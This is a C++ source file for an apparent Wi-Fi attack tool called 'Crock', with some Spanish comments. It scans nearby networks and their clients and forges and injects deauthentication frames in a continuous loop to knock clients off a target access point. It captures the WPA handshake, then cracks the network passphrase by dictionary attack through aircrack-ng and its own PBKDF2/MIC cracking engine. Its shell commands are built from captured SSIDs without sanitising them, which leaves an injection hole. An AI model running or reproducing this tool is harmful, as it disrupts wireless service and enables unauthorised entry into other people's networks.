#include "Crock.h"
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sstream>
#include <set>
#include <ctime>
#include <unistd.h>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <dirent.h>
#include <chrono>

std::map<std::string, APInfo> Crock::targets;
std::atomic<bool> Crock::keep_running(true);
std::atomic<long> Crock::packet_count(0);
std::mutex Crock::targets_mtx;
CrackStatus Crock::global_status = {"", "", "", "", 0, false, ""};

Crock::Crock() : handle(nullptr) {}
Crock::~Crock() { stop_scan(); if (handle) pcap_close(handle); }

std::vector<std::string> Crock::list_interfaces() {
  std::vector<std::string> ifaces;
  pcap_if_t *alldevs, *d;
  if (pcap_findalldevs(&alldevs, errbuf) == -1) return ifaces;
  for (d = alldevs; d != NULL; d = d->next) {
    std::string name = d->name;
    if (name == "lo" || name.find("vmnet") != std::string::npos || name.find("docker") != std::string::npos) continue;
    ifaces.push_back(name);
  }
  pcap_freealldevs(alldevs);
  return ifaces;
}

bool Crock::auto_monitor(const std::string &iface) {
  std::system("airmon-ng check kill > /dev/null 2>&1");
  std::string cmd = "ip link set " + iface + " down && iw " + iface + " set type monitor && ip link set " + iface + " up";
  return std::system(cmd.c_str()) == 0;
}

bool Crock::restore_interface(const std::string &iface) {
  std::string cmd = "ip link set " + iface + " down && iw " + iface + " set type managed && ip link set " + iface + " up && systemctl start NetworkManager";
  return std::system(cmd.c_str()) == 0;
}

void Crock::set_channel(int channel) {
  if (current_iface.empty()) return;
  std::system(("iw dev " + current_iface + " set channel " + std::to_string(channel)).c_str());
}

void Crock::channel_hopper() {
  int ch = 1;
  while (keep_running) {
    set_channel(ch);
    ch = (ch % 13) + 1;
    std::this_thread::sleep_for(std::chrono::milliseconds(250));
  }
}

bool Crock::set_interface(const std::string &iface) {
  current_iface = iface;
  handle = pcap_open_live(iface.c_str(), 65535, 1, 1, errbuf);
  return handle != nullptr;
}

const std::map<std::string, APInfo>& Crock::get_targets() const { return targets; }
void Crock::clear_targets() { std::lock_guard<std::mutex> lock(targets_mtx); targets.clear(); packet_count = 0; }

void Crock::packet_handler(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
  (void)user;
  if (!keep_running) return;
  packet_count++;
  uint16_t rt_len = *(uint16_t *)(packet + 2);
  const u_char *dot11 = packet + rt_len;
  if (pkthdr->caplen < (uint32_t)rt_len + 24) return;

  uint8_t type = (dot11[0] & 0x0C) >> 2;
  uint8_t subtype = (dot11[0] & 0xF0) >> 4;

  std::lock_guard<std::mutex> lock(targets_mtx);
  if (type == 0 && (subtype == 8 || subtype == 5)) { // Beacon or Probe Response
    u_char bssid_raw[6]; std::memcpy(bssid_raw, dot11 + 10, 6);
    char b[18]; std::snprintf(b, 18, "%02x:%02x:%02x:%02x:%02x:%02x", bssid_raw[0], bssid_raw[1], bssid_raw[2], bssid_raw[3], bssid_raw[4], bssid_raw[5]);
    std::string bssid(b);
    std::string ssid = "<HIDDEN>"; int chan = 1;
    std::string enc = "OPEN";
    int offset = 36;
    while ((int)(rt_len + offset + 2) < (int)pkthdr->caplen) {
        uint8_t id = dot11[offset], len = dot11[offset+1];
        if ((int)(rt_len + offset + 2 + len) > (int)pkthdr->caplen) break;
        if (id == 0 && len > 0 && len < 33) ssid = std::string((char*)(dot11+offset+2), len);
        else if (id == 3 && len >= 1) chan = dot11[offset+2];
        else if (id == 48 && len >= 4) {
            // RSN IE: parse AKM to distinguish WPA2 vs WPA3
            const u_char *rsn = dot11 + offset + 2;
            int roff = 2; // skip version
            roff += 4;    // skip group cipher
            if (roff + 2 <= len) {
                uint16_t pcnt = rsn[roff] | (rsn[roff+1] << 8); roff += 2;
                roff += pcnt * 4; // skip pairwise ciphers
            }
            if (roff + 2 <= len) {
                uint16_t acnt = rsn[roff] | (rsn[roff+1] << 8); roff += 2;
                bool has_sae = false, has_psk = false;
                for (int a = 0; a < acnt && roff + 4 <= len; a++, roff += 4) {
                    uint8_t suite = rsn[roff+3];
                    if (suite == 2 || suite == 6) has_psk = true;
                    if (suite == 8) has_sae = true;
                }
                if (has_sae && has_psk) enc = "WPA3-T"; // Transition mode
                else if (has_sae)       enc = "WPA3";
                else                    enc = "WPA2";
            } else enc = "WPA2";
        }
        else if (id == 221 && len >= 4) {
            // Vendor IE: check for WPA (Microsoft OUI 00:50:F2, type 01)
            const u_char *v = dot11 + offset + 2;
            if (v[0]==0x00 && v[1]==0x50 && v[2]==0xF2 && v[3]==0x01 && enc == "OPEN")
                enc = "WPA";
        }
        offset += 2 + len;
    }
    if (targets.find(bssid) == targets.end()) targets[bssid] = {bssid, ssid, enc, chan, (int8_t)packet[18], false, {}, {}};
    else {
        targets[bssid].signal = (int8_t)packet[rt_len > 18 ? 18 : 0];
        targets[bssid].channel = chan;
        if (ssid != "<HIDDEN>") targets[bssid].ssid = ssid;
        if (enc != "OPEN") targets[bssid].encryption = enc;
    }
  }

  if (type == 2) { // Data frames — track clients + hunt EAPOL
    uint8_t to_ds   = (dot11[1] & 0x01);
    uint8_t from_ds = (dot11[1] & 0x02) >> 1;
    u_char bssid_raw[6], cli_raw[6];
    if (!to_ds && from_ds) {                    // AP → STA
        std::memcpy(bssid_raw, dot11 + 10, 6);
        std::memcpy(cli_raw,   dot11 + 4,  6);
    } else if (to_ds && !from_ds) {             // STA → AP
        std::memcpy(bssid_raw, dot11 + 4,  6);
        std::memcpy(cli_raw,   dot11 + 10, 6);
    } else return;

    char b[18]; std::snprintf(b, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
        bssid_raw[0],bssid_raw[1],bssid_raw[2],bssid_raw[3],bssid_raw[4],bssid_raw[5]);
    std::string bssid(b);
    if (targets.find(bssid) == targets.end()) return;

    // Track client MAC — filter broadcast, multicast, and AP's own MAC
    char cm[18]; std::snprintf(cm, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
        cli_raw[0],cli_raw[1],cli_raw[2],cli_raw[3],cli_raw[4],cli_raw[5]);
    std::string cli_str(cm);
    bool is_bcast = (cli_raw[0] == 0xff);
    bool is_mcast = (cli_raw[0] & 0x01) != 0;
    bool is_apown = (std::memcmp(cli_raw, bssid_raw, 6) == 0);
    auto &ap = targets[bssid];
    if (!is_bcast && !is_mcast && !is_apown)
        if (std::find(ap.clients.begin(), ap.clients.end(), cli_str) == ap.clients.end())
            ap.clients.push_back(cli_str);

    // Hunt EAPOL
    for (uint32_t i = rt_len; i + 8 < pkthdr->caplen; i++) {
        if (packet[i] == 0x88 && packet[i+1] == 0x8e) {
            const u_char *eapol = packet + i + 2;
            uint32_t remain = pkthdr->caplen - (i + 2);
            if (remain < 99) break; // too short to be valid EAPOL-Key
            auto &hs = ap.handshake;
            std::memcpy(hs.ap_mac,  bssid_raw, 6);
            std::memcpy(hs.cli_mac, cli_raw,   6);
            uint16_t key_info  = (eapol[5] << 8) | eapol[6];
            bool key_ack    = (key_info & 0x0080) != 0;
            bool key_mic    = (key_info & 0x0100) != 0;
            bool key_secure = (key_info & 0x0200) != 0;
            bool is_m1 = key_ack  && !key_mic;               // AP→STA
            bool is_m2 = key_mic  && !key_ack && !key_secure; // STA→AP
            if (is_m1) {
                std::memcpy(hs.anonce, eapol + 17, 32);
                hs.m1_seen = true;
            } else if (is_m2 && hs.m1_seen) {
                std::memcpy(hs.snonce, eapol + 17, 32);
                std::memcpy(hs.mic,    eapol + 81, 16);
                uint16_t elen = 4 + ((eapol[2] << 8) | eapol[3]);
                if (elen > remain) elen = (uint16_t)remain;
                hs.eapol_frame.assign(eapol, eapol + elen);
                hs.complete = true;
                ap.handshake_captured = true;
            }
            break;
        }
    }
  }
}

void Crock::start_scan() {
  keep_running = true;
  if (!handle) { std::fprintf(stderr, "[!] No hay handle pcap abierto. Llama set_interface() primero.\n"); return; }
  hopper_thread = std::thread(&Crock::channel_hopper, this);
  long last_printed = -1;
  while (keep_running) {
    pcap_dispatch(handle, 32, packet_handler, nullptr);
    long cur = packet_count.load();
    // Pintar tabla: en el primer paquete, cada 50, o cuando llegan redes nuevas
    if (cur != last_printed && (cur == 0 || cur % 50 == 0 || !targets.empty())) {
      last_printed = cur;
      std::printf("\033[H\033[J\033[1;30m[ CROCK SCAN MODE ]\033[0m Packets: %ld | Nets: %zu\n----------------------------------------------------------------------\nID  | BSSID              | CH  | PWR   | SSID\n", cur, targets.size());
      std::lock_guard<std::mutex> lock(targets_mtx);
      int id = 1;
      for (auto const& [b, i] : targets) { if (id > 15) break; std::printf("%-3d | %-18s | %-3d | %3ddB | %s %s\n", id++, b.c_str(), i.channel, i.signal, i.ssid.c_str(), i.handshake_captured ? "\033[1;32m[HS]\033[0m" : ""); }
      std::fflush(stdout);
    }
    usleep(5000); // 5ms — no quema CPU y procesa paquetes rápido
  }
  if (hopper_thread.joinable()) hopper_thread.join();
}

// Injects deauth: src→dst, reason 7. Both broadcast (AP spoof) and directed (client spoof)
static void inject_deauth(pcap_t *h, const u_char *ap, const u_char *dst) {
    u_char f[26] = {0xc0,0x00,0x3a,0x01,
        0,0,0,0,0,0,   // DA (dst)
        0,0,0,0,0,0,   // SA (src=AP)
        0,0,0,0,0,0,   // BSSID (AP)
        0x00,0x00,     // seq
        0x07,0x00      // reason: class3
    };
    std::memcpy(f+4,  dst, 6);  // DA
    std::memcpy(f+10, ap,  6);  // SA
    std::memcpy(f+16, ap,  6);  // BSSID
    for (int i = 0; i < 64; i++) { pcap_inject(h, f, 26); usleep(1000); }
}


void Crock::send_deauth(const std::string &bssid_str) {
    u_char ap[6]; unsigned int x[6];
    std::sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x", &x[0],&x[1],&x[2],&x[3],&x[4],&x[5]);
    for (int i=0;i<6;i++) ap[i]=(u_char)x[i];
    u_char bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    inject_deauth(handle, ap, bcast);
}



// ── Parse airodump-ng CSV to get associated clients for a BSSID ───────────────
static std::vector<std::string> parse_csv_clients(const std::string &csv_path,
                                                    const std::string &bssid_upper) {
    std::vector<std::string> clients;
    std::ifstream f(csv_path);
    if (!f) return clients;
    std::string line;
    bool in_sta = false;
    while (std::getline(f, line)) {
        if (line.find("Station MAC") != std::string::npos) { in_sta = true; continue; }
        if (!in_sta || line.size() < 17) continue;
        std::vector<std::string> fields;
        std::stringstream ss(line);
        std::string tok;
        while (std::getline(ss, tok, ',')) {
            while (!tok.empty() && (tok[0]==' '||tok[0]=='\t')) tok.erase(0,1);
            while (!tok.empty() && (tok.back()==' '||tok.back()=='\t'||tok.back()=='\r')) tok.pop_back();
            fields.push_back(tok);
        }
        if (fields.size() < 6) continue;
        std::string sta   = fields[0]; // Station MAC
        std::string assoc = fields[5]; // Associated BSSID
        for (auto &c : assoc) c = (char)toupper((unsigned char)c);
        if (assoc != bssid_upper) continue;
        for (auto &c : sta) c = (char)tolower((unsigned char)c);
        if (sta.size() < 17) continue;
        unsigned int fb = 0; std::sscanf(sta.c_str(), "%x", &fb);
        if (fb == 0xff || (fb & 0x01)) continue; // filter broadcast/multicast
        if (std::find(clients.begin(), clients.end(), sta) == clients.end())
            clients.push_back(sta);
    }
    return clients;
}

// ── Handshake verification ─────────────────────────────────────────────────────
static bool hs_check_tshark(const std::string &cap) {
    // Count EAPOL frames; >=2 means at least M1+M2
    FILE *p = popen(("tshark -r " + cap + " -Y eapol 2>/dev/null | wc -l").c_str(), "r");
    if (!p) return false;
    int n = 0; std::fscanf(p, "%d", &n); pclose(p);
    return n >= 2;
}
static bool hs_check_aircrack(const std::string &cap) {
    return std::system(("aircrack-ng " + cap + " 2>&1 | grep -qi 'handshake'").c_str()) == 0;
}

void Crock::targeted_attack(const std::string &bssid, const std::vector<std::string>& wordlists) {
    keep_running = false;
    if (hopper_thread.joinable()) hopper_thread.join();
    keep_running = true;

    int chan; std::string ssid_local, enc_local;
    {
        std::lock_guard<std::mutex> lock(targets_mtx);
        chan       = targets[bssid].channel;
        ssid_local = targets[bssid].ssid;
        enc_local  = targets[bssid].encryption;
    }
    std::printf("\n\033[1;31m[+] Starting attacks against %s (%s)\033[0m\n",
        bssid.c_str(), ssid_local.c_str());

    // ── Setup paths ───────────────────────────────────────────────────────────
    std::string bssid_safe = bssid;
    for (auto &c : bssid_safe) if (c == ':') c = '_';
    std::string cap_prefix = "/tmp/crock_" + bssid_safe;
    std::string cap_file   = cap_prefix + "-01.cap";
    std::string csv_file   = cap_prefix + "-01.csv";
    for (int n = 1; n <= 9; n++) {
        std::remove((cap_prefix + "-0" + std::to_string(n) + ".cap").c_str());
        std::remove((cap_prefix + "-0" + std::to_string(n) + ".csv").c_str());
    }

    // ── 1. airodump-ng: capture + CSV for client discovery ───────────────────
    std::string dump_cmd =
        "airodump-ng --bssid " + bssid +
        " -c " + std::to_string(chan) +
        " -w " + cap_prefix +
        " --output-format pcap,csv " +
        current_iface + " > /dev/null 2>&1 &";
    std::system(dump_cmd.c_str());
    std::printf("[*] %s (%s) WPA Handshake capture: Listening...\n",
        ssid_local.c_str(), bssid.c_str());
    sleep(2);

    // BSSID in uppercase for CSV matching
    std::string bssid_upper = bssid;
    for (auto &c : bssid_upper) c = (char)toupper((unsigned char)c);

    // ── 2. Continuous deauth thread ───────────────────────────────────────────
    std::vector<std::string> known_clients;
    std::set<std::string> announced;
    std::atomic<bool> deauth_active(true);

    std::thread deauth_t([&]() {
        while (deauth_active && keep_running) {
            std::vector<std::string> snap = known_clients; // safe read (main only writes)
            if (!snap.empty()) {
                for (const auto &cli : snap) {
                    if (!deauth_active) break;
                    std::system(("aireplay-ng --deauth 8 -a " + bssid +
                        " -c " + cli + " " + current_iface + " > /dev/null 2>&1").c_str());
                }
            } else {
                std::system(("aireplay-ng --deauth 8 -a " + bssid +
                    " " + current_iface + " > /dev/null 2>&1").c_str());
            }
            usleep(500000); // 0.5s between bursts
        }
    });

    // ── 2.5 Sniffer en segundo plano para el motor nativo ────────────────────
    std::atomic<bool> sniffing(true);
    std::thread sniffer_t([&]() {
        while (sniffing && keep_running) {
            pcap_dispatch(handle, 10, packet_handler, nullptr);
            usleep(1000);
        }
    });

    // ── 3. Main loop: discover clients + check handshake ─────────────────────
    bool handshake_found = false;
    auto t0 = std::chrono::steady_clock::now();

    while (keep_running && !handshake_found) {
        int elapsed = (int)std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::steady_clock::now() - t0).count();

        // Discover clients from CSV
        auto csv_cli = parse_csv_clients(csv_file, bssid_upper);
        for (const auto &cli : csv_cli) {
            if (std::find(known_clients.begin(), known_clients.end(), cli) == known_clients.end()) {
                known_clients.push_back(cli);
                if (announced.find(cli) == announced.end()) {
                    std::printf("\n[+] %s (%s) WPA Handshake capture: Discovered new client: %s\n",
                        ssid_local.c_str(), bssid.c_str(), cli.c_str());
                    announced.insert(cli);
                }
            }
        }

        std::printf("\r[*] %s | %3ds | clients: %zu | deauthing...",
            ssid_local.c_str(), elapsed, known_clients.size());
        std::fflush(stdout);

        // Check handshake: motor interno nativo primero, luego aircrack
        bool internal_hs = false;
        {
            std::lock_guard<std::mutex> lock(targets_mtx);
            internal_hs = targets[bssid].handshake.complete;
        }

        if (internal_hs || hs_check_aircrack(cap_file)) {
            handshake_found = true;
            break;
        }
        sleep(2);
    }

    // Detener sniffer interno
    sniffing = false;
    if (sniffer_t.joinable()) sniffer_t.join();

    // Stop deauth + airodump
    deauth_active = false;
    if (deauth_t.joinable()) deauth_t.join();
    std::system("pkill -f airodump-ng > /dev/null 2>&1");
    sleep(1);

    if (!handshake_found) {
        std::printf("\n[!] Captura cancelada.\n");
        keep_running = true;
        return;
    }

    std::printf("\n[+] %s (%s) WPA Handshake capture: \033[1;32mCaptured handshake\033[0m\n",
        ssid_local.c_str(), bssid.c_str());

    // ── 4. Save to hs/ directory (like Wifite) ────────────────────────────────
    std::system("mkdir -p hs");
    std::time_t now = std::time(nullptr);
    struct tm *ti = std::localtime(&now);
    char ts[32]; std::strftime(ts, sizeof(ts), "%Y-%m-%dT%H-%M-%S", ti);
    std::string safe_ssid = ssid_local;
    for (auto &c : safe_ssid) if (c == ' ') c = '_';
    std::string save_path = "hs/handshake_" + safe_ssid + "_" +
                            bssid_safe + "_" + std::string(ts) + ".cap";
    std::system(("cp " + cap_file + " " + save_path).c_str());
    std::printf("[+] saving copy of handshake to %s\n\n", save_path.c_str());

    // ── 5. Verify with tshark + aircrack ──────────────────────────────────────
    std::printf("[+] analysis of captured handshake file:\n");
    std::system(("tshark -r " + save_path +
        " -Y eapol 2>/dev/null | head -4").c_str());
    std::system(("aircrack-ng " + save_path +
        " 2>&1 | grep -i 'handshake\\|network'").c_str());

    // ── 6. Crack con aircrack-ng ─────────────────────────────────────────────
    keep_running = true;
    std::printf("\n[+] Cracking WPA Handshake (Aircrack-ng Engine):\n");
    bool cracked = false;
    for (const auto &dict : wordlists) {
        std::printf("[*] Running aircrack-ng with %s\n", dict.c_str());
        // Forzamos el ESSID exacto con -e por si no se capturó el beacon
        std::string crack = "aircrack-ng -b " + bssid + " -e \"" + ssid_local + "\" -w \"" + dict + "\" " + save_path;
        // Wifite y aircrack normalmente devuelven 0 si crackean y 1 si fallan.
        if (std::system(crack.c_str()) == 0) {
            cracked = true;
            break;
        }
    }
    
    // Fallback: Si aircrack falla (ej. si no reconoció los paquetes EAPOL en el .cap),
    // forzamos nuestra función local escrita en C++ usando la info en memoria.
    if (!cracked) {
        std::printf("[!] \033[1;31mAircrack-ng falló o no pudo procesar la captura.\033[0m\n");
        std::printf("\033[1;33m[!] INICIANDO MOTOR DE FUERZA BRUTA NATIVO (CROCK ENGINE)...\033[0m\n");
        
        HandshakeData hs;
        {
            std::lock_guard<std::mutex> lock(targets_mtx);
            hs = targets[bssid].handshake;
        }
        
        if (hs.complete) {
            crack_loop(bssid, hs, ssid_local, wordlists);
            if (global_status.cracked) {
                cracked = true;
            }
        } else {
            std::printf("[!] \033[1;31mEl motor nativo no tiene un handshake completo en memoria.\033[0m\n");
        }
    }

    if (!cracked) {
        std::printf("[!] \033[1;31mFailed to crack: password not in wordlist(s) or bad capture.\033[0m\n");
    }

    // Limpiar toda la mierda sobrante de temporales
    std::system(("rm -f " + cap_prefix + "-*").c_str());
}




void Crock::stop_scan() { keep_running = false; if (hopper_thread.joinable()) hopper_thread.join(); }

void Crock::derive_pmk(const std::string &pass, const std::string &ssid, u_char *pmk) { PKCS5_PBKDF2_HMAC(pass.c_str(), pass.length(), (const u_char*)ssid.c_str(), ssid.length(), 4096, EVP_sha1(), 32, pmk); }
void Crock::derive_ptk(const u_char *pmk, const u_char *ap, const u_char *cl, const u_char *an, const u_char *sn, u_char *ptk) {
    u_char d[100]; 
    std::memcpy(d, "Pairwise key expansion", 22); 
    d[22] = 0x00; // Null byte separator
    u_char *p = d + 23;
    if (std::memcmp(ap, cl, 6) < 0) { std::memcpy(p, ap, 6); std::memcpy(p+6, cl, 6); } else { std::memcpy(p, cl, 6); std::memcpy(p+6, ap, 6); } p += 12;
    if (std::memcmp(an, sn, 32) < 0) { std::memcpy(p, an, 32); std::memcpy(p+32, sn, 32); } else { std::memcpy(p, sn, 32); std::memcpy(p+32, an, 32); }
    for (int i = 0; i < 4; i++) { 
        u_char in[100]; 
        std::memcpy(in, d, 99); 
        in[99] = (u_char)i; // Index byte at the very end
        unsigned int l; 
        HMAC(EVP_sha1(), pmk, 32, in, 100, ptk + (i * 20), &l); 
    }
}
// use_md5=true for WPA/TKIP, false for WPA2/WPA3 (CCMP uses SHA1)
bool Crock::verify_mic(const u_char *ptk, const std::vector<u_char> &f, const u_char *orig, bool use_md5) {
    if (f.size() < 97) return false; // sanity: minimum valid EAPOL-Key frame
    std::vector<u_char> d = f;
    std::memset(d.data() + 81, 0, 16); // zero MIC field before computing
    u_char m[20]; unsigned int l;
    if (use_md5) {
        // WPA/TKIP: MIC = HMAC-MD5(KCK, frame)[0..15]
        HMAC(EVP_md5(), ptk, 16, d.data(), d.size(), m, &l);
    } else {
        // WPA2/CCMP and WPA3-Transition: MIC = HMAC-SHA1(KCK, frame)[0..15]
        HMAC(EVP_sha1(), ptk, 16, d.data(), d.size(), m, &l);
    }
    return std::memcmp(m, orig, 16) == 0;
}

void Crock::crack_loop(std::string bssid, HandshakeData hs, std::string ssid, const std::vector<std::string>& wordlists) {
    // Determine cipher type from AP info to select correct MIC algorithm
    bool use_md5 = false;
    {
        std::lock_guard<std::mutex> lock(targets_mtx);
        auto it = targets.find(bssid);
        if (it != targets.end()) {
            const std::string& enc = it->second.encryption;
            use_md5 = (enc == "WPA"); // TKIP uses HMAC-MD5; CCMP/WPA2/WPA3 use HMAC-SHA1
        }
    }
    std::printf("\n\033[1;33m[!] CRACKING ENGINE STARTED | Cipher: %s\033[0m\n", use_md5 ? "WPA/TKIP (MD5)" : "WPA2/WPA3 (SHA1)");
    std::printf("[*] AP MAC  : %02x:%02x:%02x:%02x:%02x:%02x\n", hs.ap_mac[0],hs.ap_mac[1],hs.ap_mac[2],hs.ap_mac[3],hs.ap_mac[4],hs.ap_mac[5]);
    std::printf("[*] CLI MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", hs.cli_mac[0],hs.cli_mac[1],hs.cli_mac[2],hs.cli_mac[3],hs.cli_mac[4],hs.cli_mac[5]);
    std::printf("[*] ANonce  : %02x%02x%02x%02x...\n", hs.anonce[0],hs.anonce[1],hs.anonce[2],hs.anonce[3]);
    std::printf("[*] SNonce  : %02x%02x%02x%02x...\n", hs.snonce[0],hs.snonce[1],hs.snonce[2],hs.snonce[3]);
    std::printf("[*] MIC     : %02x%02x%02x%02x...\n", hs.mic[0],hs.mic[1],hs.mic[2],hs.mic[3]);
    std::printf("[*] EAPOL frame len: %zu bytes\n\n", hs.eapol_frame.size());

    for (const auto& dict_path : wordlists) {
        std::ifstream f(dict_path);
        if (!f) { std::printf("[!] Skip: %s (not found)\n", dict_path.c_str()); continue; }
        global_status.current_dict = dict_path;
        std::string p;
        while (std::getline(f, p)) {
            if (!p.empty() && p.back() == '\r') p.pop_back();
            if (p.size() < 8 || p.size() > 63) continue; // WPA passphrase constraints
            if (!keep_running) return;
            global_status.current_key = p;
            global_status.tried_keys++;
            u_char pmk[32], ptk[80];
            derive_pmk(p, ssid, pmk);
            derive_ptk(pmk, hs.ap_mac, hs.cli_mac, hs.anonce, hs.snonce, ptk);
            if (verify_mic(ptk, hs.eapol_frame, hs.mic, use_md5)) {
                global_status.cracked = true;
                global_status.result = p;
                std::printf("\n\n\033[1;32m[!!!] KEY FOUND in %s: %s [!!!]\033[0m\n\n", dict_path.c_str(), p.c_str());
                return;
            }
            if (global_status.tried_keys % 250 == 0) {
                std::printf("\r[*] [%s] Testing: %-20s (%ld)", dict_path.c_str(), p.c_str(), global_status.tried_keys);
                std::fflush(stdout);
            }
        }
        std::printf("\n[*] Finished: %s. Moving to next...\n", dict_path.c_str());
    }
    std::printf("\n\033[1;31m[!] Exhausted all wordlists. No luck.\033[0m\n");
}
